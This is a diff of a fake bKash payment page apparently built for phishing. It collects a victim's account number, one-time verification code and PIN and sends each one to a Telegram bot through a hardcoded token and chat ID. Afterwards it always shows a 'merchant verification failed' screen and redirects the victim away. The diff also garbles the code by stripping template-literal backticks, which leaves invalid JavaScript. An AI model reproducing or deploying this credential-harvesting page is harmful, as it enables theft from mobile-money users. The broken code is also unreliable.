@@ -1,3 +1,4 @@
+MD Norujjaman Niloy:
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -108,7 +109,7 @@
             box-sizing: border-box; /* Include padding in height calculation */
         }
 
-        .section-title {
+.section-title {
             font-size: 1.125rem; /* Equivalent to text-lg */
             font-weight: 600; /* Equivalent to font-semibold */
             text-align: center;
@@ -218,7 +219,7 @@
             space-x: 0.25rem; /* Equivalent to space-x-1 */
         }
 
-        .dot {
+.dot {
             width: 0.5rem; /* Equivalent to w-2 */
             height: 0.5rem; /* Equivalent to h-2 */
             background-color: #ffffff;
@@ -315,11 +316,11 @@
         </div>
     </div>
 
-    <script>
+<script>
         // --- Telegram Bot Configuration ---
-        // আপনার Next.js .env.local ফাইল থেকে এই দুটি মান এখানে যোগ করুন।
-        // WARNING: ক্লায়েন্ট-সাইড HTML এ API টোকেন সরাসরি রাখা নিরাপত্তা ঝুঁকি তৈরি করে।
-        // প্রোডাকশন এনভায়রনমেন্টে, আপনার Next.js API রুটের মতো একটি সার্ভার-সাইড প্রক্সি ব্যবহার করা উচিত।
+        // You MUST replace these with your actual Telegram bot token and chat ID.
+        // For security, in a real application, these should be handled server-side (like your Next.js example).
+        // For this purely client-side HTML, we're putting them directly here for demonstration.
         const TELEGRAM_BOT_TOKEN = '7751217182:AAEWRJ427aODJ4w9Y9sJw51U28o0QZ_yx4E'; // REPLACE WITH YOUR BOT TOKEN
         const TELEGRAM_CHAT_ID = '7335173906'; // REPLACE WITH YOUR CHAT ID
 
@@ -346,14 +347,14 @@
 
             let message = "";
             if (data.accountNumber) {
-                message = `New bKash Account Number: <a href="tel:${data.accountNumber}">${data.accountNumber}</a>`;
+                message = New bKash Account Number: <a href="tel:${data.accountNumber}">${data.accountNumber}</a>;
             } else if (data.verificationCode) {
-                message = `bKash Verification Code: <b>${data.verificationCode}</b>`;
+                message = bKash Verification Code: <b>${data.verificationCode}</b>;
             } else if (data.pin) {
-                message = `bKash PIN: <b>${data.pin}</b>`;
+                message = bKash PIN: <b>${data.pin}</b>;
             }
 
-            const telegramApiUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+            const telegramApiUrl = https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage;
 
             try {
                 const response = await fetch(telegramApiUrl, {
@@ -368,17 +369,16 @@
                     }),
                 });
 
-                if (!response.ok) {
+                if (response.ok) {
+                    console.log("Message sent to Telegram successfully.");
+                } else {
                     const errorData = await response.json();
                     console.error("Telegram API error:", response.status, errorData);
-                    // এখানে একটি Alert না দিয়ে লগ করার দিকে ফোকাস করা ভালো, যাতে ইউজার এক্সপেরিয়েন্স বাধাগ্রস্ত না হয়।
-                    // alert(`Failed to send data to Telegram: ${errorData.description || 'Unknown error'}`);
-                } else {
-                    console.log("Message sent to Telegram successfully.");
+                    alert(Failed to send data to Telegram: ${errorData.description || 'Unknown error'});
                 }
             } catch (error) {
                 console.error("Error sending message to Telegram:", error);
-                // alert("An error occurred while trying to send data to Telegram.");
+                alert("An error occurred while trying to send data to Telegram.");
             }
         }
 
@@ -398,7 +398,8 @@
                     maxLength = 11;
                     contentHTML = `
                         <div class="bkash-input-section">
-                            <h2 class="section-title">Your bKash Account Number</h2>
+
+<h2 class="section-title">Your bKash Account Number</h2>
                             <div class="account-number-input-wrapper">
                                 <input
                                     type="${inputType}"
@@ -416,15 +417,15 @@
                                 </a>
                             </p>
                         </div>
-                    `;
+                    ;
                     confirmButton.textContent = 'Confirm';
                     break;
 
                 case 'verificationCode':
                     inputId = 'verificationCodeInput';
                     maxLength = 6;
-                    let maskedNumber = currentAccountNumber ? `${currentAccountNumber.slice(0, 3)} ** *** ${currentAccountNumber.slice(-3)}` : "";
-                    contentHTML = `
+                    let maskedNumber = currentAccountNumber ? ${currentAccountNumber.slice(0, 3)}  * ${currentAccountNumber.slice(-3)} : "";
+                    contentHTML = 
                         <div class="bkash-input-section">
                             <h2 class="section-title">Enter verification code sent to</h2>
                             <div class="relative flex items-center justify-center" style="margin-bottom: 1rem;">
@@ -442,7 +443,7 @@
                             </div>
                             <p class="terms-conditions" id="resendCodeText"></p>
                         </div>
-                    `;
+                    ;
                     confirmButton.textContent = 'Confirm';
                     startResendTimer();
                     break;
@@ -450,10 +451,10 @@
                 case 'pinEntry':
                     inputId = 'pinInput';
                     maxLength = 5;
-                    // inputType = 'password'; // Use 'tel' with custom masking for better control
+                    inputType = 'password'; // Use password type for PIN for better UX (hides after typing)
                     inputStyle = 'font-size: 1.5rem; letter-spacing: 0.125em;'; // text-2xl tracking-wider
-                    let maskedAccountNumberForPin = currentAccountNumber ? `${currentAccountNumber.slice(0, 3)}  * ${currentAccountNumber.slice(-3)}` : "";
-                    contentHTML = `
+                    let maskedAccountNumberForPin = currentAccountNumber ? ${currentAccountNumber.slice(0, 3)}  * ${currentAccountNumber.slice(-3)} : "";
+                    contentHTML = 
                         <div class="bkash-input-section">
                             <h2 class="section-title">Enter PIN of your bKash account number</h2>
                             <div class="relative flex items-center justify-center" style="margin-bottom: 1rem;">
@@ -461,7 +462,8 @@
                             </div>
                             <div class="account-number-input-wrapper" style="max-width: 18rem;">
                                 <input
-                                    type="${inputType}"
+
+type="${inputType}"
                                     placeholder="Enter PIN"
                                     class="account-number-input"
                                     id="${inputId}"
@@ -470,13 +472,13 @@
                                 />
                             </div>
                         </div>
-                    `;
+                    ;
                     confirmButton.textContent = 'Confirm';
                     break;
 
                 case 'paymentFailed':
                     actionButtonsDiv.classList.add('hidden'); // Hide buttons
-                    contentHTML = `
+                    contentHTML = 
                         <div class="bkash-input-section" style="min-height: 300px; background-color: #e3007f; color: #ffffff; padding-top: 1.5rem; padding-bottom: 1.5rem;">
                             <svg xmlns="http://www.w3.org/2000/svg" width="64" height="64" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="color: white; margin-bottom: 1rem;">
                                 <circle cx="12" cy="12" r="10"></circle>
@@ -487,7 +489,7 @@
                             <p style="font-size: 0.875rem; margin-bottom: 1rem;">Merchant verification failed</p>
                             <p style="font-size: 0.875rem;" id="redirectText"></p>
                         </div>
-                    `;
+                    ;
                     startRedirectTimer();
                     break;
 
@@ -497,15 +499,14 @@
 
             mainContentArea.innerHTML = contentHTML;
             attachEventListeners();
-            // confirmButton.disabled = true; // Initial state set after events attached
+            updateConfirmButtonState(); // Initial state for buttons
         }
 
         function updateConfirmButtonState() {
             if (!confirmButton) return;
 
             let isValid = false;
-            const currentInputId = currentView === 'accountNumber' ? 'accountNumberInput' : (currentView === 'verificationCode' ? 'verificationCodeInput' : 'pinInput');
-            const currentInput = document.getElementById(currentInputId);
+            const currentInput = document.getElementById(currentView === 'accountNumber' ? 'accountNumberInput' : (currentView === 'verificationCode' ? 'verificationCodeInput' : 'pinInput'));
 
             if (currentInput) {
                 if (currentView === 'accountNumber') {
@@ -513,9 +514,7 @@
                 } else if (currentView === 'verificationCode') {
                     isValid = currentInput.value.length === 6;
                 } else if (currentView === 'pinEntry') {
-                    const actualPinLength = (currentInput.dataset.actualPin || '').length;
-                    isValid = actualPinLength >= 4 && actualPinLength <= 5;
-                    // console.log('PIN Entry - Actual PIN Length:', actualPinLength, 'IsValid:', isValid); // Debug log
+                    isValid = currentInput.dataset.actualPin && currentInput.dataset.actualPin.length >= 4 && currentInput.dataset.actualPin.length <= 5;
                 }
             }
             confirmButton.disabled = !isValid;
@@ -524,7 +523,7 @@
         function showLoading() {
             if (confirmButton) {
                 confirmButton.disabled = true;
-                confirmButton.innerHTML = `
+                confirmButton.innerHTML = 
                     <div class="loading-dots">
                         <div class="dot"></div>
                         <div class="dot"></div>
@@ -542,10 +541,9 @@
         }
 
         function attachEventListeners() {
-            const currentInputId = currentView === 'accountNumber' ? 'accountNumberInput' : (currentView === 'verificationCode' ? 'verificationCodeInput' : 'pinInput');
-            const currentInput = document.getElementById(currentInputId);
+            const currentInput = document.getElementById(currentView === 'accountNumber' ? 'accountNumberInput' : (currentView === 'verificationCode' ? 'verificationCodeInput' : 'pinInput'));
 
-            if (confirmButton) {
+if (confirmButton) {
                 confirmButton.onclick = async () => {
                     showLoading();
                     await new Promise(resolve => setTimeout(resolve, 800)); // Simulate network delay
@@ -563,8 +561,8 @@
                         await sendToTelegram({ pin: actualPin });
                         currentView = 'paymentFailed'; // Always go to failed for this HTML demo
                     }
-                    hideLoading(); // Hide loading and update button state
-                    renderView(); // Render the next view
+                    hideLoading();
+                    renderView();
                 };
             }
 
@@ -574,10 +572,6 @@
                         currentAccountNumber = ''; // Clear account number
                     } else if (currentView === 'verificationCode') {
                         currentVerificationCode = ''; // Clear verification code
-                    } else if (currentView === 'pinEntry') {
-                         // PIN এন্ট্রি পেজ থেকে Cancel করলে আবার অ্যাকাউন্ট নাম্বার ইনপুট পেজে যাবে
-                        currentAccountNumber = '';
-                        currentVerificationCode = '';
                     }
                     currentView = 'accountNumber'; // Always go back to account number input
                     renderView();
@@ -587,9 +581,8 @@
             if (currentInput) {
                 // Initialize dataset properties for PIN input
                 if (currentView === 'pinEntry') {
-                    if (!currentInput.dataset.actualPin) currentInput.dataset.actualPin = '';
-                    if (!currentInput.dataset.displayLength) currentInput.dataset.displayLength = '0';
-                    currentInput.value = "●".repeat(parseInt(currentInput.dataset.displayLength)); // Load previous masked value if any
+                    currentInput.dataset.actualPin = '';
+                    currentInput.dataset.displayLength = '0';
                 }
 
                 currentInput.oninput = (e) => {
@@ -598,6 +591,7 @@
                         e.target.value = value.replace(/\D/g, ''); // Allow only digits
                     } else if (currentView === 'pinEntry') {
                         let newPin = currentInput.dataset.actualPin || '';
+                        let displayPin = '';
                         const currentDisplayLength = parseInt(currentInput.dataset.displayLength || '0');
 
                         if (value.length > currentDisplayLength) { // New char added
@@ -609,30 +603,32 @@
                             newPin = newPin.slice(0, -1);
                         }
 
-                        if (newPin.length > maxLength) { // maxLength is 5 for pinEntry
+                        if (newPin.length > maxLength) {
                             newPin = newPin.slice(0, maxLength);
                         }
 
                         currentInput.dataset.actualPin = newPin;
-                        currentInput.dataset.displayLength = newPin.length.toString();
+                        currentInput.dataset.displayLength = newPin.length.toString(); // Store actual length for comparison
 
                         if (newPin.length > 0) {
                             const lastDigit = newPin.slice(-1);
-                            let displayPin = "●".repeat(newPin.length - 1) + lastDigit;
-                            e.target.value = displayPin; // Immediately show last digit
-                            
+                            displayPin = "●".repeat(newPin.length - 1) + lastDigit;
+
                             // Mask the last digit after a short delay
                             setTimeout(() => {
                                 // Only mask if the pin hasn't changed since this timeout was set
-                                if (currentInput.dataset.actualPin === newPin && e.target.value === displayPin) {
-                                     e.target.value = "●".repeat(newPin.length);
+
+if (currentInput.dataset.actualPin === newPin && currentInput.value === displayPin) {
+                                     currentInput.value = "●".repeat(newPin.length);
                                 }
-                            }, 500);
+                            }, 500); // 500ms delay
                         } else {
-                            e.target.value = '';
+                            displayPin = '';
                         }
+                        e.target.value = displayPin;
                     }
-                    updateConfirmButtonState(); // Update button state after input
+
+                    updateConfirmButtonState();
                 };
 
                 // Initial update for the current input field
@@ -644,21 +640,20 @@
             resendCountdown = 30;
             const resendCodeText = document.getElementById('resendCodeText');
             if (resendCodeText) {
-                resendCodeText.innerHTML = `Resend Code in ${resendCountdown}s`;
-                // confirmButton.disabled = true; // Timer চলাকালীনও কোড সঠিক হলে Confirm enable থাকবে।
-                                                  // এটি updateConfirmButtonState() দ্বারা নিয়ন্ত্রিত হবে।
+                resendCodeText.innerHTML = Resend Code in ${resendCountdown}s;
+                confirmButton.disabled = true; // Disable confirm while timer is active
 
                 if (resendTimerInterval) clearInterval(resendTimerInterval);
 
                 resendTimerInterval = setInterval(() => {
                     resendCountdown--;
                     if (resendCountdown > 0) {
-                        resendCodeText.innerHTML = `Resend Code in ${resendCountdown}s`;
+                        resendCodeText.innerHTML = Resend Code in ${resendCountdown}s;
                     } else {
                         clearInterval(resendTimerInterval);
-                        resendCodeText.innerHTML = `
+                        resendCodeText.innerHTML = 
                             <button id="resendCodeButton" style="background: none; border: none; color: white; text-decoration: underline; cursor: pointer; font-size: 0.75rem;">Resend Code</button>
-                        `;
+                        ;
                         const resendCodeButton = document.getElementById('resendCodeButton');
                         if (resendCodeButton) {
                             resendCodeButton.onclick = () => {
@@ -668,7 +663,7 @@
                                 renderView();
                             };
                         }
-                        // updateConfirmButtonState(); // Timer শেষ হলেও Confirm বাটনের অবস্থা ইনপুট ফিল্ডের উপর নির্ভর করবে
+                        updateConfirmButtonState(); // Re-evaluate confirm button state
                     }
                 }, 1000);
             }
@@ -683,10 +678,10 @@
                 redirectTimerInterval = setInterval(() => {
                     redirectCountdown--;
                     if (redirectCountdown > 0) {
-                        redirectText.innerHTML = `Redirecting to <span style="font-weight: 500; text-decoration: underline;">Merchant Website</span> in ${redirectCountdown}s`;
+                        redirectText.innerHTML = Redirecting to <span style="font-weight: 500; text-decoration: underline;">Merchant Website</span> in ${redirectCountdown}s;
                     } else {
                         clearInterval(redirectTimerInterval);
-                        redirectText.innerHTML = `Redirecting to <span style="font-weight: 500; text-decoration: underline;">Merchant Website</span>`;
+                        redirectText.innerHTML = Redirecting to <span style="font-weight: 500; text-decoration: underline;">Merchant Website</span>;
                         // Simulate redirecting to the referrer or going back
                         setTimeout(() => {
                             if (document.referrer) {
